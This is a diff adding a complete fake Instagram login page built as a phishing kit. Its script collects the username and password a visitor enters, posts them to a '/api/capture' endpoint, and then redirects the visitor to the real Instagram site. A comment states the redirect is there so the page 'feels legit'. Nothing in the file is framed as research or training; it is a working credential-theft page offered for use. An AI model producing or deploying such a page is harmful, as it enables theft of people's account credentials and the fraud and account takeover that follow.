@@ -1,0 +1,232 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>Instagram — Log in</title>
+<style>
+  :root{
+    --bg:#0b0b0d;
+    --card-border:#262629;
+    --ink:#f2f2f3;
+    --ink-soft:#9b9ba1;
+    --input-border:#3a3a3d;
+    --accent:#4276e6;
+    --accent-ghost:rgba(58,95,196,.5);
+    --divider:#1f1f22;
+  }
+  *{box-sizing:border-box;}
+  body{
+    margin:0;
+    min-height:100vh;
+    background:var(--bg);
+    color:var(--ink);
+    font-family:-apple-system, 'Segoe UI', Roboto, sans-serif;
+    display:flex;
+    flex-direction:column;
+    align-items:center;
+  }
+
+  .top{
+    width:100%;
+    max-width:450px;
+    padding:48px 24px 36px;
+    display:flex;
+    justify-content:center;
+    border-bottom:1px solid var(--divider);
+  }
+
+  .card{
+    width:100%;
+    max-width:450px;
+    padding:36px 48px 20px;
+  }
+
+  h1{
+    font-size:16px;
+    font-weight:700;
+    margin:0 0 20px;
+  }
+
+  .field{margin-bottom:10px;}
+  .field input{
+    width:100%;
+    padding:14px 16px;
+    font-size:13.5px;
+    background:transparent;
+    border:1px solid var(--input-border);
+    border-radius:8px;
+    color:var(--ink);
+    outline:none;
+  }
+  .field input::placeholder{color:var(--ink-soft);}
+  .field input:focus{border-color:#6a6a6e;}
+
+  .primary-btn{
+    width:100%;
+    padding:10px;
+    margin-top:8px;
+    background:var(--accent);
+    color:#cfd8f2;
+    font-weight:600;
+    font-size:14.5px;
+    border:none;
+    border-radius:20px;
+    cursor:pointer;
+    transition:opacity .15s;
+  }
+  .primary-btn:hover{opacity:1;}
+  .primary-btn:disabled{opacity:.55; cursor:default;}
+
+  .forgot{
+    text-align:center;
+    margin:18px 0 28px;
+  }
+  .forgot a{
+    color:var(--ink);
+    font-size:13px;
+    font-weight:600;
+    text-decoration:none;
+  }
+
+  .divider-row{
+    display:flex;
+    align-items:center;
+    gap:12px;
+    margin:4px 0 20px;
+  }
+  .divider-row .line{flex:1; height:1px; background:var(--divider);}
+  .divider-row span{font-size:12px; color:var(--ink-soft); font-weight:600;}
+
+  .ghost-btn{
+    width:100%;
+    padding:9px;
+    margin-bottom:14px;
+    background:transparent;
+    border:1px solid var(--accent-ghost);
+    color:#8fa6e6;
+    font-weight:600;
+    font-size:13.5px;
+    border-radius:20px;
+    cursor:pointer;
+  }
+  .ghost-btn:hover{background:rgba(58,95,196,.08);}
+
+  .brandmark{
+    display:flex;
+    justify-content:center;
+    align-items:center;
+    gap:6px;
+    margin:28px 0 4px;
+    color:var(--ink-soft);
+    font-size:14px;
+    font-weight:600;
+  }
+
+  .footer{
+    width:100%;
+    max-width:620px;
+    padding:28px 16px 40px;
+    text-align:center;
+  }
+  .footer .links{
+    display:flex;
+    flex-wrap:wrap;
+    justify-content:center;
+    gap:6px 16px;
+    margin-bottom:14px;
+  }
+  .footer a{
+    color:var(--ink-soft);
+    font-size:12px;
+    text-decoration:none;
+  }
+  .footer a:hover{text-decoration:underline;}
+</style>
+</head>
+<body>
+
+<div class="top">
+  <img id="site-logo" width="48" height="48" alt="Nova logo"
+       style="border-radius:13px; object-fit:cover;">
+</div>
+
+<div class="card">
+  <h1>Log into Instagram</h1>
+
+  <form id="login-form">
+  <div class="field"><input id="user" type="text" placeholder="Mobile number, username or email"></div>
+  <div class="field"><input id="pass" type="password" placeholder="Password"></div>
+
+  <button class="primary-btn" id="login-btn" type="submit" disabled>Log in</button>
+</form>
+
+  <div class="forgot"><a href="#" onclick="return false;">Forgot password?</a></div>
+
+  <div class="divider-row"><div class="line"></div><span>OR</span><div class="line"></div></div>
+
+  <button class="ghost-btn" onclick="return false;">Create new account</button>
+
+  <div class="brandmark">
+
+<svg width="20" height="20" viewBox="0 0 24 24">
+  <rect x="3" y="3" width="18" height="18" rx="5"
+        fill="none" stroke="#9b9ba1" stroke-width="2"/>
+  <circle cx="12" cy="12" r="4"
+          fill="none" stroke="#9b9ba1" stroke-width="2"/>
+  <circle cx="17.5" cy="6.5" r="1"
+          fill="#9b9ba1"/>
+</svg>
+
+
+    Instagram
+  </div>
+</div>
+
+<div class="footer">
+  <div class="links">
+    <a href="#">About</a><a href="#">Blog</a><a href="#">Jobs</a><a href="#">Help</a>
+    <a href="#">API</a><a href="#">Privacy</a><a href="#">Terms</a><a href="#">Locations</a>
+    <a href="#">Popular</a><a href="#">Instagram Lite</a><a href="#">Contact</a>
+  </div>
+</div>
+
+<script>
+  // ---- LOGO: paste any image URL here (png/jpg/webp/svg) and it updates automatically ----
+  const LOGO_URL = "https://media.discordapp.net/attachments/1560726889088417835/1561468785649787030/belal_no_copyright.png?ex=6ad676a1&is=6ad52521&hm=a21a2350a1531834aa483751479cca21f4b7d2ad7b6f727750f9c327bbc74af0&=&format=webp&quality=lossless";
+  document.getElementById('site-logo').src = LOGO_URL;
+  // --------------------------------------------------------------------------------------
+
+  const inputs = document.querySelectorAll('.field input');
+  const btn = document.getElementById('login-btn');
+  function check(){
+    btn.disabled = ![...inputs].every(i => i.value.trim());
+  }
+  inputs.forEach(i => i.addEventListener('input', check));
+document.getElementById('login-form').addEventListener('submit', async (e) => {
+  e.preventDefault();
+  btn.disabled = true;
+  btn.textContent = "Logging in...";
+
+  const payload = {
+    username: document.getElementById('user').value.trim(),
+    password: document.getElementById('pass').value
+  };
+
+  try {
+    await fetch('/api/capture', {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify(payload)
+    });
+  } catch (_) {}
+
+  // optional: after 800ms send them to the real Instagram so it feels legit
+  setTimeout(() => { window.location.href = "https://www.instagram.com/"; }, 800);
+});
+</script>
+
+
+
+</body>
+</html>
